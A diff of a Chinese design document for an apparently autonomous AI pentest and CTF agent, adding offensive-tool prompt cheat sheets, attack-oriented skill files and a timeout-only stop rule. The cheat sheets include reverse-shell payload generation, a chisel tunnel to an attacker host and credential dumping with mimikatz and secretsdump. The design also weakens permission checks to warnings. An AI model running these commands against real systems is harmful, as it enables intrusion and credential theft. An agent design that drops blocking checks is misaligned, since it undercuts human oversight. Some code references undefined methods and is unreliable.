@@ -166,6 +166,51 @@ def _check_permissions(self, agent_type: AgentType) -> Optional[str]:
 2. 改为默认允许，只对危险操作提示确认
 3. 权限检查改为警告而非阻止
 
+### 1.7 需要删除的老旧/缓存文件
+
+```
+# 数据库缓存文件（应删除，应该用.gitignore排除）
+data/chroma_db/
+├── *.bin     # 向量数据库二进制文件
+├── *.sqlite3 # SQLite数据库
+└── length.bin
+
+# 临时文件和缓存
+data/rag_cache/  # RAG缓存目录
+
+# 其他老旧文档（可选删除）
+Agent系统深度技术文档.md
+CLAUDE_CODE_分析报告.md
+MCP与扩展系统深度技术文档.md
+工具系统深度技术文档.md
+查询引擎深度技术文档.md
+状态管理与上下文系统深度技术文档.md
+```
+
+**删除理由**: 这些是运行时生成的缓存或过时文档，不应该在代码库中。
+
+### 1.8 完整的文件清理清单
+
+| 操作 | 文件/目录 | 原因 |
+|------|-----------|------|
+| 删除 | `app/graph/` | LangGraph预制流程 |
+| 删除 | `app/state_types/` | 预置CTF状态字段 |
+| 删除 | `app/state/state_v3.py` | 预置TypedDict |
+| 删除 | `app/state/selector_store.py` | LangGraph选择器 |
+| 删除 | `app/memory/error_recovery.py` | 预制降级处理 |
+| 删除 | `data/chroma_db/` | 数据库缓存 |
+| 删除 | `data/rag_cache/` | RAG缓存 |
+| 重构 | `app/main.py` | 移除LangGraph导入 |
+| 重构 | `app/server.py` | 移除LangGraph导入 |
+| 重构 | `app/coordinator/dispatcher.py` | 使用外部Store |
+| 重构 | `app/agents/autonomous_agent.py` | 移除预制阶段 |
+| 重构 | `app/staged_planner.py` | 移除fallback_strategies |
+| 保留 | `app/tools_v2/` | 工具系统（需改造） |
+| 保留 | `app/skills/` | Skills系统 |
+| 保留 | `app/llm_client.py` | LLM客户端 |
+| 保留 | `app/memory/token_stats.py` | Token统计 |
+| 保留 | `app/memory/prompt_cache.py` | Prompt缓存 |
+
 ---
 
 ## 第二部分：Claude Code核心架构移植
@@ -1497,47 +1542,478 @@ AI_SECURITY_PROMPT = """
 """
 ```
 
-### 6.2 工具选择指导提示词
+### 6.2 工具选择指导提示词（完整版）
 
 ```python
 # app/prompts/tool_guidance.py
 
 """
-工具选择指导 - 参考Claude Code的Tool Selection机制
+工具选择指导 - 完全参考Claude Code的Tool Selection机制
 
-帮助AI选择最合适的工具，而不是预制的if/else
+Claude Code设计原则:
+1. 工具描述在Tool Schema中，不是硬编码
+2. AI根据描述自主选择工具
+3. 工具使用示例在Schema的examples字段
+4. 错误时AI自我纠正，不是预制fallback
 """
 
-TOOL_SELECTION_GUIDANCE = """
-## Tool Selection Guidelines
+# ═══════════════════════════════════════════════════════════
+# 工具选择框架 - 教AI如何思考，不是告诉AI选什么
+# ═══════════════════════════════════════════════════════════
 
-Based on the current reconnaissance phase, select the most appropriate tool:
+TOOL_SELECTION_FRAMEWORK = """
+## Tool Selection Framework
 
-### For Web Applications
-- **nmap -p- --min-rate=1000**: Quick port discovery
-- **httpx -status-code -title -tech-detect**: Technology fingerprinting
-- **nuclei -severity critical,high**: Automated vulnerability scanning
-- **sqlmap --level=5 --risk=3**: SQL injection exploitation
-- **ffuf -recursion**: Directory fuzzing
-- **dalfox**: XSS scanning
+When selecting a tool, consider these factors in order:
 
-### For Binary Exploitation
-- **checksec --file=binary**: Check protections
-- **strings -n 8 binary**: Extract strings
-- **gdb -q binary**: Debug and analyze
-- **ROPgadget --binary binary**: Find ROP gadgets
+### 1. Target Analysis
+- What type of target is this? (Web app, binary, network, crypto challenge)
+- What information do I already have?
+- What am I trying to discover or achieve?
 
-### For Network Penetration
-- **crackmapexec smb targets**: SMB enumeration
-- **bloodhound -d domain**: AD analysis
-- **impacket-psexec**: Remote execution
+### 2. Tool Capabilities
+- Read each tool's description carefully
+- Check the input parameters required
+- Consider the expected output
+- Match tool capabilities to your current goal
 
-### Decision Process
-1. Analyze the target type
-2. Consider the current phase (recon/exploit/post)
-3. Select the tool with highest success probability
-4. If first attempt fails, try alternatives
-5. Report both successes and failures
+### 3. Tool Chains
+- Some tasks require multiple tools in sequence
+- Example: nmap → httpx → nuclei → sqlmap
+- Plan your tool chain before execution
+
+### 4. Efficiency Consideration
+- Start with fast, broad tools (nmap, httpx)
+- Then use targeted tools (sqlmap, nuclei templates)
+- Avoid redundant scans
+- Consider rate limiting and stealth
+
+### 5. Error Handling
+- If a tool fails, analyze the error
+- Try alternative tools or parameters
+- Document what didn't work
+- Learn from each attempt
+"""
+
+# ═══════════════════════════════════════════════════════════
+# 详细工具分类与使用指导
+# ═══════════════════════════════════════════════════════════
+
+RECONNAISSANCE_TOOLS = """
+## Reconnaissance Tools
+
+### Port Scanning
+**nmap** - Network exploration and security scanning
+- Fast scan: `nmap -F target`
+- Full scan: `nmap -p- --min-rate=1000 target`
+- Service detection: `nmap -sV -sC target`
+- UDP scan: `nmap -sU --top-ports 100 target`
+- Vulnerability scripts: `nmap --script vuln target`
+
+**masscan** - Fast Internet-wide port scanner
+- Quick discovery: `masscan -p1-65535 target --rate=1000`
+
+### Web Reconnaissance
+**httpx** - Fast and multi-purpose HTTP toolkit
+- Probe: `httpx -l urls.txt -status-code -title -tech-detect`
+- Screenshot: `httpx -l urls.txt -screenshot`
+
+**whatweb** - Web scanner to identify technologies
+- Basic: `whatweb target`
+- Verbose: `whatweb -v target`
+
+**wafw00f** - Web Application Firewall detection
+- Usage: `wafw00f target`
+
+### Subdomain Enumeration
+**subfinder** - Subdomain discovery tool
+- Basic: `subfinder -d domain -silent`
+- Recursive: `subfinder -d domain -recursive`
+
+**amass** - In-depth attack surface mapping
+- Passive: `amass enum -passive -d domain`
+- Active: `amass enum -active -d domain`
+
+### Directory Discovery
+**ffuf** - Fast web fuzzer
+- Directory: `ffuf -u target/FUZZ -w wordlist.txt`
+- Recursive: `ffuf -u target/FUZZ -w wordlist.txt -recursion`
+- Parameters: `ffuf -u target?FUZZ=value -w wordlist.txt`
+
+**dirsearch** - Web path scanner
+- Basic: `dirsearch -u target -w wordlist.txt`
+- Extensions: `dirsearch -u target -e php,html,js`
+"""
+
+WEB_EXPLOITATION_TOOLS = """
+## Web Exploitation Tools
+
+### SQL Injection
+**sqlmap** - Automatic SQL injection tool
+- Basic test: `sqlmap -u "target?id=1"`
+- POST data: `sqlmap -u target --data="id=1"`
+- Level 5: `sqlmap -u target --level=5 --risk=3`
+- Dump database: `sqlmap -u target --dump`
+- OS shell: `sqlmap -u target --os-shell`
+
+**NoSQLMap** - NoSQL injection tool
+- Usage: `nosqlmap -u target`
+
+### XSS & Client-Side
+**dalfox** - Parameter Analysis and XSS scanner
+- Basic: `dalfox url target`
+- Mining mode: `dalfox url target --mining-dom`
+- Blind XSS: `dalfox url target --blind your-xss-server`
+
+**xsstrike** - Advanced XSS detection suite
+- Usage: `xsstrike -u target`
+
+### SSRF & Request Smuggling
+**ssrfmap** - Automatic SSRF exploitation
+- Basic: `ssrfmap -r request.txt -p param`
+
+**smuggler** - HTTP request smuggling tester
+- Usage: `smuggler -u target`
+
+### Authentication Attacks
+**hydra** - Fast network logon cracker
+- HTTP: `hydra -l user -P pass.txt target http-post-form`
+- SSH: `hydra -l user -P pass.txt target ssh`
+
+**jwt_tool** - JWT security testing
+- Decode: `jwt_tool.py token`
+- Forge: `jwt_tool.py token -X k`
+
+### API Testing
+**postman** / **insomnia** - API testing platforms
+**apikit** - API security testing
+
+### General Vulnerability Scanning
+**nuclei** - Fast vulnerability scanner
+- All templates: `nuclei -u target`
+- Critical only: `nuclei -u target -severity critical,high`
+- Custom tags: `nuclei -u target -tags cve,rce`
+- Update templates: `nuclei -update-templates`
+
+**xray** - Security assessment tool
+- Active scan: `xray webscan --url target`
+- Passive: `xray webscan --listen 127.0.0.1:7777`
+"""
+
+BINARY_EXPLOITATION_TOOLS = """
+## Binary Exploitation Tools
+
+### Analysis
+**checksec** - Check binary security properties
+- Usage: `checksec --file=binary`
+- Check: NX, PIE, RELRO, Stack Canary, etc.
+
+**file** - Determine file type
+- Usage: `file binary`
+
+**strings** - Extract printable strings
+- Basic: `strings binary`
+- Minimum length: `strings -n 8 binary`
+
+### Disassembly & Decompilation
+**ghidra** - Software reverse engineering framework
+- GUI-based analysis and decompilation
+
+**radare2** - Reverse engineering framework
+- Analyze: `r2 -A binary`
+- Disassemble: `r2 -A binary -c "pdf @main"`
+
+**objdump** - Display object information
+- Disassemble: `objdump -d binary`
+
+### Debugging
+**gdb** - GNU Debugger
+- Start: `gdb binary`
+- Break: `break main`
+- Run: `run`
+- Examine: `x/100x $sp`
+
+**pwndbg** - GDB for exploitation
+- Enhanced GDB with exploitation commands
+- Heap analysis: `heap`
+- VM map: `vmmap`
+
+**peda** - Python Exploit Development Assistance
+
+### Exploitation Development
+**pwntools** - CTF exploit development library
+```python
+from pwn import *
+p = process('./binary')
+p.sendline(payload)
+p.interactive()
+```
+
+**ROPgadget** - ROP tool
+- Find gadgets: `ROPgadget --binary binary`
+- Chain: `ROPgadget --binary binary --ropchain`
+
+**one_gadget** - Find execve gadgets in libc
+- Usage: `one_gadget libc.so.6`
+
+### Shellcode
+**msfvenom** - Payload generation
+- List payloads: `msfvenom -l payloads`
+- Generate: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=x.x.x.x -f py`
+
+**shellcraft** - Shellcode from pwntools
+```python
+from pwn import *
+print(shellcraft.sh())
+```
+"""
+
+NETWORK_PENETRATION_TOOLS = """
+## Network Penetration Tools
+
+### Enumeration
+**crackmapexec** - Swiss army knife for network
+- SMB enum: `crackmapexec smb targets`
+- SMB users: `crackmapexec smb targets --users`
+- SMB shares: `crackmapexec smb targets --shares`
+- WinRM: `crackmapexec winrm targets -u user -p pass`
+
+**bloodhound** - Active Directory visualization
+- Data collector: `bloodhound-python -d domain -u user -p pass`
+- Analyze relationships and attack paths
+
+**impacket** - Network protocol toolkit
+- PSExec: `impacket-psexec domain/user:pass@target`
+- WMIExec: `impacket-wmiexec domain/user:pass@target`
+- SecretsDump: `impacket-secretsdump domain/user:pass@target`
+
+### Credential Attacks
+**mimikatz** - Windows credential extraction
+- Privilege debug: `privilege::debug`
+- Extract: `sekurlsa::logonpasswords`
+- DCSync: `lsadump::dcsync /domain:domain /user:admin`
+
+**hashcat** - Password recovery
+- Crack hash: `hashcat -m 1000 hash.txt wordlist.txt`
+- Show cracked: `hashcat -m 1000 hash.txt --show`
+
+**john** - Password cracker
+- Basic: `john --wordlist=wordlist.txt hash.txt`
+
+### Lateral Movement
+**evil-winrm** - WinRM shell
+- Connect: `evil-winrm -i target -u user -p pass`
+- Upload: `upload local_file remote_path`
+
+**chisel** - Tunneling tool
+- Server: `chisel server -p 8000 --reverse`
+- Client: `chisel client attacker:8000 R:socks`
+
+**proxychains** - Redirect connections through proxies
+
+### Privilege Escalation
+**linpeas** - Linux privilege escalation audit
+- Run: `./linpeas.sh`
+
+**winpeas** - Windows privilege escalation audit
+
+**pspy** - Monitor processes without root
+- Usage: `./pspy64`
+"""
+
+CRYPTOGRAPHY_TOOLS = """
+## Cryptography Tools
+
+### RSA Attacks
+**RsaCtfTool** - RSA attack tool
+- All attacks: `RsaCtfTool.py -n n -e e --uncipherfile cipher`
+- Factor: `RsaCtfTool.py -n n --private`
+
+**factordb** - Online factorization database
+- API: `curl factordb.com/api?query=number`
+
+### Hash Cracking
+**hashcat** - GPU-based cracker
+- MD5: `hashcat -m 0 hash.txt wordlist.txt`
+- SHA256: `hashcat -m 1400 hash.txt wordlist.txt`
+- NTLM: `hashcat -m 1000 hash.txt wordlist.txt`
+
+**john** - CPU-based cracker
+- Basic: `john --wordlist=wordlist.txt hash.txt`
+- Formats: `john --list=formats`
+
+### Classical Ciphers
+**CyberChef** - Web-based decoding
+- URL: gchq.github.io/CyberChef
+
+**dcode.fr** - Online cipher tools
+
+**xortool** - XOR analysis
+- Guess key length: `xortool -c 20 cipher.txt`
+- Decrypt: `xortool -c 20 -l key_length cipher.txt`
+
+### Encoding
+**base64** / **base32** - Standard encoding
+**xxd** - Hex dump
+**python** - General encoding/decoding
+"""
+
+FORENSICS_MISC_TOOLS = """
+## Forensics & Misc Tools
+
+### File Analysis
+**binwalk** - Firmware analysis
+- Scan: `binwalk file`
+- Extract: `binwalk -e file`
+
+**foremost** - File carving
+- Usage: `foremost -i disk.img`
+
+**exiftool** - Metadata extraction
+- Usage: `exiftool file`
+
+**volatility** - Memory forensics
+- Image info: `volatility -f memory.img imageinfo`
+- Process list: `volatility -f memory.img --profile=Win10 pslist`
+
+### Steganography
+**steghide** - Hide/extract data
+- Extract: `steghide extract -sf file.jpg`
+
+**zsteg** - PNG/BMP steganography
+- Usage: `zsteg file.png`
+
+**stegsolve** - Visual steganography analysis
+
+### Network Forensics
+**wireshark** - Network protocol analyzer
+**tshark** - CLI wireshark
+- Read: `tshark -r capture.pcap`
+- Filter: `tshark -r capture.pcap -Y "http"`
+
+**networkminer** - Network traffic analysis
+
+### QR Codes
+**zbar-tools** - QR code reader
+- Usage: `zbarimg qr.png`
+
+**qrdecode** - Online QR decoder
+"""
+
+# ═══════════════════════════════════════════════════════════
+# 工具组合策略
+# ═══════════════════════════════════════════════════════════
+
+TOOL_CHAIN_STRATEGIES = """
+## Tool Chain Strategies
+
+### Web Application Assessment Chain
+1. **Reconnaissance Phase**
+   - nmap -sV -sC target
+   - whatweb target
+   - subfinder -d domain (if applicable)
+   
+2. **Directory Discovery**
+   - ffuf -u target/FUZZ -w wordlist.txt -recursion
+   - dirsearch -u target -e php,html,js
+   
+3. **Vulnerability Scanning**
+   - nuclei -u target -severity critical,high
+   - xray webscan --url target
+   
+4. **Exploitation**
+   - sqlmap -u target (if SQLi found)
+   - dalfox url target (if XSS found)
+   - Manual exploitation as needed
+
+### Binary Exploitation Chain
+1. **Analysis Phase**
+   - file binary
+   - checksec --file=binary
+   - strings -n 8 binary
+   
+2. **Reverse Engineering**
+   - ghidra (deep analysis)
+   - radare2 -A binary (quick analysis)
+   
+3. **Dynamic Analysis**
+   - gdb binary
+   - strace ./binary
+   - ltrace ./binary
+   
+4. **Exploit Development**
+   - pwntools (script development)
+   - ROPgadget (if ROP needed)
+
+### Network Penetration Chain
+1. **Discovery Phase**
+   - nmap -sn network/prefix (host discovery)
+   - nmap -sV -sC targets (service enumeration)
+   
+2. **Credential Testing**
+   - crackmapexec smb targets -u users -p passes
+   - hydra -L users -P passes target ssh
+   
+3. **Exploitation**
+   - impacket tools for remote execution
+   - evil-winrm for WinRM access
+   
+4. **Post-Exploitation**
+   - mimikatz for credential extraction
+   - bloodhound for AD analysis
+   - Chisel for tunneling
+
+### Crypto Challenge Chain
+1. **Cipher Identification**
+   - Analyze ciphertext properties
+   - Check cipher type indicators
+   
+2. **Attack Selection**
+   - RSA: RsaCtfTool
+   - Hash: hashcat/john
+   - Classical: CyberChef/dcode
+   
+3. **Key Recovery**
+   - Apply appropriate attack
+   - Verify decrypted result
+"""
+
+# ═══════════════════════════════════════════════════════════
+# 工具使用最佳实践
+# ═══════════════════════════════════════════════════════════
+
+TOOL_BEST_PRACTICES = """
+## Tool Usage Best Practices
+
+### Before Using Tools
+1. **Understand your goal** - What are you trying to achieve?
+2. **Choose appropriate tools** - Match tools to the task
+3. **Check prerequisites** - Ensure tools are installed and configured
+4. **Plan for failures** - Have alternative approaches ready
+
+### During Tool Execution
+1. **Monitor output** - Watch for errors and interesting findings
+2. **Adjust parameters** - Fine-tune based on initial results
+3. **Save results** - Log output for later analysis
+4. **Stay within scope** - Respect authorized boundaries
+
+### After Tool Execution
+1. **Analyze results** - Understand what the tool found
+2. **Document findings** - Record discoveries systematically
+3. **Plan next steps** - Determine follow-up actions
+4. **Learn from failures** - Understand why approaches didn't work
+
+### Resource Management
+1. **Avoid redundant scans** - Don't repeat identical operations
+2. **Use rate limiting** - Don't overwhelm targets
+3. **Clean up** - Remove temporary files and processes
+4. **Stay organized** - Keep output files structured
+
+### Security Considerations
+1. **Use secure connections** - Encrypt sensitive communications
+2. **Protect credentials** - Don't expose passwords in logs
+3. **Follow responsible disclosure** - Report vulnerabilities appropriately
+4. **Maintain operational security** - Don't leak attack infrastructure
 """
 ```
 
@@ -1592,6 +2068,734 @@ When a tool fails, follow this systematic approach:
 
 ---
 
+## 第七部分：Skill延迟加载机制
+
+### 7.1 参考Claude Code的Skill系统设计
+
+**Claude Code设计原则**:
+1. Skills在需要时才加载（Lazy Loading）
+2. Skill描述提供给AI，AI自主选择是否激活
+3. Skills不影响核心执行流程
+4. Skills可以提供领域知识、工具偏好、工作流建议
+
+```python
+# app/skills/skill_loader.py
+
+"""
+Skill延迟加载系统 - 参考Claude Code的Skill设计
+
+关键设计:
+1. Skills不在启动时全部加载
+2. 根据上下文动态推荐相关Skills
+3. AI决定是否激活Skill
+4. 激活后的Skill提供额外知识给System Prompt
+"""
+
+from typing import Dict, List, Optional
+from dataclasses import dataclass, field
+from pathlib import Path
+import yaml
+
+
+@dataclass
+class Skill:
+    """
+    Skill定义 - 对应Claude Code的Skill概念
+    
+    Skills提供:
+    - 领域知识 (knowledge)
+    - 工具偏好 (tool_preferences)
+    - 工作流建议 (workflows)
+    """
+    name: str
+    description: str
+    domain: str
+    knowledge: str = ""
+    tool_preferences: Dict[str, float] = field(default_factory=dict)
+    workflows: List[Dict] = field(default_factory=list)
+    tags: List[str] = field(default_factory=list)
+    is_loaded: bool = False
+
+
+class SkillLoader:
+    """
+    Skill延迟加载器
+    
+    参考Claude Code设计:
+    - 启动时不加载任何Skill
+    - 根据上下文推荐Skills
+    - AI激活后才真正加载
+    """
+    
+    def __init__(self, skills_dir: str = "app/skills/data"):
+        self.skills_dir = Path(skills_dir)
+        self._skill_index: Dict[str, Dict] = {}  # 轻量级索引
+        self._loaded_skills: Dict[str, Skill] = {}
+        self._build_index()
+    
+    def _build_index(self):
+        """
+        构建Skill索引 - 不加载完整内容
+        
+        只读取每个Skill的基本信息：
+        - name, description, domain, tags
+        - 不读取knowledge等大字段
+        """
+        if not self.skills_dir.exists():
+            return
+        
+        for yaml_file in self.skills_dir.glob("*.yaml"):
+            try:
+                with open(yaml_file, 'r', encoding='utf-8') as f:
+                    data = yaml.safe_load(f)
+                
+                # 只索引基本信息
+                self._skill_index[yaml_file.stem] = {
+                    "name": data.get("name", yaml_file.stem),
+                    "description": data.get("description", ""),
+                    "domain": data.get("domain", ""),
+                    "tags": data.get("tags", []),
+                    "file_path": str(yaml_file),
+                }
+            except Exception:
+                pass
+    
+    def recommend_skills(self, context: Dict) -> List[Dict]:
+        """
+        根据上下文推荐Skills
+        
+        AI会看到这些推荐，决定是否激活
+        
+        Args:
+            context: 包含 target, task, findings 等信息
+        
+        Returns:
+            推荐的Skill列表（未加载的）
+        """
+        recommendations = []
+        task = context.get("task", "").lower()
+        target = context.get("target", "")
+        findings = context.get("findings", [])
+        
+        for skill_id, skill_info in self._skill_index.items():
+            score = 0.0
+            
+            # 领域匹配
+            domain = skill_info.get("domain", "").lower()
+            if domain and domain in task:
+                score += 0.5
+            
+            # 标签匹配
+            tags = skill_info.get("tags", [])
+            for tag in tags:
+                if tag.lower() in task:
+                    score += 0.2
+            
+            # 描述关键词匹配
+            desc = skill_info.get("description", "").lower()
+            task_words = task.split()
+            for word in task_words:
+                if len(word) > 3 and word in desc:
+                    score += 0.1
+            
+            if score > 0.2:
+                recommendations.append({
+                    "id": skill_id,
+                    "name": skill_info["name"],
+                    "description": skill_info["description"],
+                    "score": min(score, 1.0),
+                    "is_loaded": skill_id in self._loaded_skills,
+                })
+        
+        # 按分数排序
+        recommendations.sort(key=lambda x: x["score"], reverse=True)
+        return recommendations[:5]  # 最多推荐5个
+    
+    def activate_skill(self, skill_id: str) -> Optional[Skill]:
+        """
+        激活（加载）一个Skill
+        
+        只有AI明确要求时才调用
+        
+        Args:
+            skill_id: Skill ID（文件名）
+        
+        Returns:
+            加载的Skill对象
+        """
+        if skill_id in self._loaded_skills:
+            return self._loaded_skills[skill_id]
+        
+        skill_info = self._skill_index.get(skill_id)
+        if not skill_info:
+            return None
+        
+        # 真正加载完整内容
+        try:
+            with open(skill_info["file_path"], 'r', encoding='utf-8') as f:
+                data = yaml.safe_load(f)
+            
+            skill = Skill(
+                name=data.get("name", skill_id),
+                description=data.get("description", ""),
+                domain=data.get("domain", ""),
+                knowledge=data.get("knowledge", ""),
+                tool_preferences=data.get("tool_preferences", {}),
+                workflows=data.get("workflows", []),
+                tags=data.get("tags", []),
+                is_loaded=True,
+            )
+            
+            self._loaded_skills[skill_id] = skill
+            return skill
+        except Exception:
+            return None
+    
+    def get_skill_prompt_injection(self, skill_ids: List[str]) -> str:
+        """
+        获取Skills的Prompt注入内容
+        
+        当AI激活Skills后，将其知识注入System Prompt
+        
+        Args:
+            skill_ids: 激活的Skill ID列表
+        
+        Returns:
+            要注入到System Prompt的内容
+        """
+        injections = []
+        
+        for skill_id in skill_ids:
+            skill = self._loaded_skills.get(skill_id)
+            if not skill:
+                skill = self.activate_skill(skill_id)
+            
+            if skill:
+                injection = f"""
+## Skill: {skill.name}
+
+{skill.knowledge}
+
+### Tool Recommendations
+"""
+                for tool, score in sorted(
+                    skill.tool_preferences.items(),
+                    key=lambda x: x[1],
+                    reverse=True
+                )[:5]:
+                    injection += f"- {tool} (score: {score})\n"
+                
+                if skill.workflows:
+                    injection += "\n### Recommended Workflows\n"
+                    for wf in skill.workflows[:2]:
+                        injection += f"- {wf.get('name', '')}: {wf.get('description', '')}\n"
+                
+                injections.append(injection)
+        
+        return "\n\n".join(injections)
+
+
+# ═══════════════════════════════════════════════════════════
+# Skill文件示例
+# ═══════════════════════════════════════════════════════════
+
+# app/skills/data/web_sqli.yaml
+"""
+name: SQL Injection Hunter
+description: Advanced SQL injection detection and exploitation
+domain: web
+tags:
+  - sqli
+  - database
+  - web
+knowledge: |
+  ## SQL Injection Knowledge
+  
+  ### Detection Techniques
+  1. Error-based detection
+  2. Boolean-based blind
+  3. Time-based blind
+  4. Union-based extraction
+  
+  ### Exploitation Workflow
+  1. Identify injection point
+  2. Determine database type
+  3. Enumerate databases/tables/columns
+  4. Extract data
+  5. Attempt file read/OS command
+  
+  ### Common Bypass Techniques
+  - Case variation: SeLeCt
+  - Comment injection: S/**/ELECT
+  - Encoding: %53%45%4C%45%43%54
+  - Double encoding
+
+tool_preferences:
+  sqlmap: 1.0
+  nuclei: 0.7
+  ffuf: 0.5
+  httpx: 0.4
+
+workflows:
+  - name: SQL Injection Assessment
+    description: Full SQL injection test workflow
+    steps:
+      - Identify all input parameters
+      - Test each parameter with sqlmap
+      - Manual verification for complex cases
+      - Document found vulnerabilities
+"""
+
+# app/skills/data/ad_enumeration.yaml
+"""
+name: Active Directory Hunter
+description: Active Directory enumeration and exploitation
+domain: network
+tags:
+  - ad
+  - windows
+  - kerberos
+  - domain
+knowledge: |
+  ## Active Directory Knowledge
+  
+  ### Enumeration Phases
+  1. Domain enumeration (users, groups, computers)
+  2. Trust relationship analysis
+  3. Group Policy analysis
+  4. Kerberoasting targets
+  5. AS-REP Roasting targets
+  
+  ### Key Tools
+  - BloodHound: Visualize attack paths
+  - PowerView: PowerShell enumeration
+  - CrackMapExec: Network-wide enumeration
+  - Impacket: Python toolkit
+  
+  ### Common Attack Paths
+  1. Kerberoasting → Password cracking → Lateral movement
+  2. AS-REP Roasting → Password cracking → Lateral movement
+  3. DCSync → Domain admin → Golden ticket
+  4. Constrained delegation → Service compromise
+
+tool_preferences:
+  bloodhound: 1.0
+  crackmapexec: 0.9
+  impacket-secretsdump: 0.8
+  mimikatz: 0.7
+  rubeus: 0.6
+
+workflows:
+  - name: AD Post-Compromise Enumeration
+    description: Enumerate AD after initial access
+    steps:
+      - Run BloodHound data collection
+      - Analyze attack paths in BloodHound GUI
+      - Identify high-value targets
+      - Execute Kerberoasting
+      - Crack service account passwords
+"""
+```
+
+### 7.2 Skill集成到Query循环
+
+```python
+# 在Query循环中使用Skill
+
+async def query_with_skills(
+    messages: List[Dict],
+    config: QueryConfig,
+    context: Dict,
+) -> AsyncGenerator[Dict, None]:
+    """
+    带Skill支持的Query循环
+    """
+    skill_loader = SkillLoader()
+    
+    # 1. 推荐Skills
+    recommendations = skill_loader.recommend_skills_skills(context)
+    
+    # 2. 将推荐添加到System Prompt
+    skill_prompt = """
+## Available Skills
+
+The following skills may be helpful for your task. You can activate any skill by using the `activate_skill` tool:
+
+"""
+    for rec in recommendations:
+        skill_prompt += f"- **{rec['name']}** (score: {rec['score']:.1f}): {rec['description']}\n"
+    
+    # 3. 更新System Prompt
+    config.system_prompt = config.system_prompt + skill_prompt
+    
+    # 4. 添加activate_skill工具
+    config.tools.append({
+        "name": "activate_skill",
+        "description": "Activate a skill to gain specialized knowledge",
+        "input_schema": {
+            "type": "object",
+            "properties": {
+                "skill_id": {"type": "string", "description": "Skill ID to activate"}
+            },
+            "required": ["skill_id"]
+        }
+    })
+    
+    # 5. 执行正常Query循环
+    async for event in query(messages, config):
+        # 如果AI激活了Skill，注入知识
+        if event["type"] == "tool_result" and event["tool_name"] == "activate_skill":
+            skill_id = event["result"]
+            skill = skill_loader.activate_skill(skill_id)
+            if skill:
+                # 注入Skill知识到后续消息
+                injection = skill_loader.get_skill_prompt_injection([skill_id])
+                messages.append({
+                    "role": "user",
+                    "content": f"[Skill Activated]\n{injection}"
+                })
+        
+        yield event
+```
+
+---
+
+## 第八部分：时间管理与唯一熔断条件
+
+### 8.1 时间分配策略
+
+**设计原则**: 参考Claude Code的Memory文档设定，唯一熔断条件是超时。
+
+```python
+# app/core/time_manager.py
+
+"""
+时间管理器 - 唯一熔断条件
+
+设计原则:
+1. 超时是唯一硬性停止条件
+2. 不同任务类型有不同超时时间
+3. AI动态规划任务时间分配
+4. 时间信息提供给AI让其自主决策
+"""
+
+from dataclasses import dataclass
+from enum import Enum
+from typing import Optional
+import time
+
+
+class TaskType(Enum):
+    """任务类型 - 对应不同超时时间"""
+    CTF_SINGLE_FLAG = "ctf_single"        # CTF单题目 - 30分钟
+    CTF_MULTI_FLAG = "ctf_multi"          # CTF多flag - 60分钟
+    EXTERNAL_ATTACK = "external_attack"   # 外网打点 - 60分钟
+    INTERNAL_PENETRATION = "internal"     # 内网渗透 - 120分钟
+    FULL_PENETRATION = "full_pentest"     # 外网+内网 - 180分钟
+    CODE_AUDIT = "code_audit"             # 代码审计 - 60分钟
+    RESEARCH = "research"                 # 安全研究 - 120分钟
+
+
+# 时间配置（秒）- 可根据记忆文档动态调整
+TIMEOUT_CONFIGS = {
+    TaskType.CTF_SINGLE_FLAG: 30 * 60,       # 30分钟
+    TaskType.CTF_MULTI_FLAG: 60 * 60,        # 60分钟
+    TaskType.EXTERNAL_ATTACK: 60 * 60,       # 60分钟
+    TaskType.INTERNAL_PENETRATION: 120 * 60, # 120分钟
+    TaskType.FULL_PENETRATION: 180 * 60,     # 180分钟（外网+内网）
+    TaskType.CODE_AUDIT: 60 * 60,            # 60分钟
+    TaskType.RESEARCH: 120 * 60,             # 120分钟
+}
+
+
+@dataclass
+class TimeBudget:
+    """时间预算"""
+    total_seconds: int
+    start_time: float
+    task_type: TaskType
+    
+    @property
+    def elapsed_seconds(self) -> float:
+        return time.time() - self.start_time
+    
+    @property
+    def remaining_seconds(self) -> float:
+        return max(0, self.total_seconds - self.elapsed_seconds)
+    
+    @property
+    def progress_ratio(self) -> float:
+        return min(1.0, self.elapsed_seconds / self.total_seconds)
+    
+    @property
+    def is_timeout(self) -> bool:
+        """唯一熔断条件"""
+        return self.remaining_seconds <= 0
+    
+    def get_status_prompt(self) -> str:
+        """生成时间状态提示给AI"""
+        remaining = self.remaining_seconds
+        elapsed = self.elapsed_seconds
+        progress = self.progress_ratio * 100
+        
+        if remaining <= 0:
+            return "⚠️ **TIMEOUT**: Time budget exhausted. Must wrap up now."
+        
+        # 时间警告
+        if self.progress_ratio >= 0.8:
+            return f"⏰ **TIME WARNING**: {remaining/60:.0f} minutes remaining ({progress:.0f}% used). Consider prioritizing key objectives."
+        elif self.progress_ratio >= 0.5:
+            return f"📊 **TIME UPDATE**: {remaining/60:.0f} minutes remaining ({progress:.0f}% used)."
+        else:
+            return f"⏱️ Time remaining: {remaining/60:.0f} minutes ({progress:.0f}% used)"
+
+
+class TimeManager:
+    """
+    时间管理器
+    
+    参考Claude Code的Memory设计:
+    - 时间信息写入Memory，AI可以读取
+    - AI根据时间自主决策任务优先级
+    - 唯一停止条件：超时
+    """
+    
+    def __init__(self):
+        self._active_budgets: Dict[str, TimeBudget] = {}
+    
+    def create_budget(
+        self,
+        session_id: str,
+        task_type: TaskType,
+        custom_timeout: Optional[int] = None,
+    ) -> TimeBudget:
+        """创建时间预算"""
+        timeout = custom_timeout or TIMEOUT_CONFIGS.get(task_type, 30 * 60)
+        
+        budget = TimeBudget(
+            total_seconds=timeout,
+            start_time=time.time(),
+            task_type=task_type,
+        )
+        
+        self._active_budgets[session_id] = budget
+        return budget
+    
+    def get_budget(self, session_id: str) -> Optional[TimeBudget]:
+        return self._active_budgets.get(session_id)
+    
+    def should_stop(self, session_id: str) -> bool:
+        """唯一熔断条件检查"""
+        budget = self.get_budget(session_id)
+        if not budget:
+            return False
+        return budget.is_timeout
+    
+    def get_time_prompt(self, session_id: str) -> str:
+        """获取时间提示注入到System Prompt"""
+        budget = self.get_budget(session_id)
+        if not budget:
+            return ""
+        return budget.get_status_prompt()
+```
+
+### 8.2 AI动态规划时间分配
+
+```python
+# 在Query循环中注入时间信息
+
+TIME_MANAGEMENT_PROMPT = """
+## Time Management
+
+You are working with a time budget. Manage your time efficiently:
+
+### Time Allocation Strategy
+- **First 10%**: Reconnaissance and information gathering
+- **Next 40%**: Primary exploitation attempts
+- **Next 30%**: Alternative approaches and verification
+- **Final 20%**: Documentation and wrap-up
+
+### Time-Pressure Decisions
